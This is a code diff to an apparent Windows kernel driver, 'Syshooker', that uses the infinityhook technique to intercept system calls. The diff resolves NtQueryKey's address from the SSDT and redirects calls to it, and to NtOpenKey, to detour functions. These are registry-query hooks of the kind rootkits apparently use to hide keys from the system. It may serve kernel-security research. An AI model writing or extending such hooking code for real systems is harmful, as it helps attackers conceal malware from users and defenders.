@@ -29,6 +29,7 @@
 #include "NtOpenProcess.h"
 #include "NtQuerySystemInformation.h"
 #include "NtOpenKey.h"
+#include "NtQueryKey.h"
 
 UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");
 
@@ -131,7 +132,7 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 
 
 	// for the syscalls that are not exported, we cannot use MmGetSystemRoutineAddress
-	// we need to resolve their address from SSDT
+	// - we need to resolve their address from SSDT
 
 	const void* SsdtAddress = GetSsdtAddress();
 	if (!SsdtAddress) {
@@ -147,6 +148,13 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 		return STATUS_ENTRYPOINT_NOT_FOUND;
 	}
 	else kprintf("[+] infinityhook: NtOpenKey address: %p.\n", OriginalNtOpenKey);
+
+	OriginalNtQueryKey = (NtQueryKey_t)GetSyscallAddress(INDEX_NTQUERYKEY, (PCHAR)SsdtAddress);
+	if (!OriginalNtQueryKey) {
+		kprintf("[-] infinityhook: Failed to locate the address of: %wZ.\n", StringNtQueryKey);
+		return STATUS_ENTRYPOINT_NOT_FOUND;
+	}
+	else kprintf("[+] infinityhook: NtQueryKey address: %p.\n", OriginalNtQueryKey);
 
 	// Try to find addresses of the registry-related syscalls
 	// const void* NtOpenKeyAddr = GetSyscallAddress(INDEX_NTOPENKEY, (PCHAR)SsdtAddress);
@@ -267,8 +275,13 @@ void __fastcall SyscallCallback(
 	//NtOpenKey
 	if (*SystemCallFunction == OriginalNtOpenKey)
 	{
-		//kprintf("[+] infinityhook: I can't believe this... %p %p\n", OriginalNtOpenKey, *SystemCallFunction);
 		*SystemCallFunction = DetourNtOpenKey;
+	}
+
+	//NtQueryKey
+	if (*SystemCallFunction == OriginalNtQueryKey)
+	{
+		*SystemCallFunction = DetourNtQueryKey;
 	}
 }
 
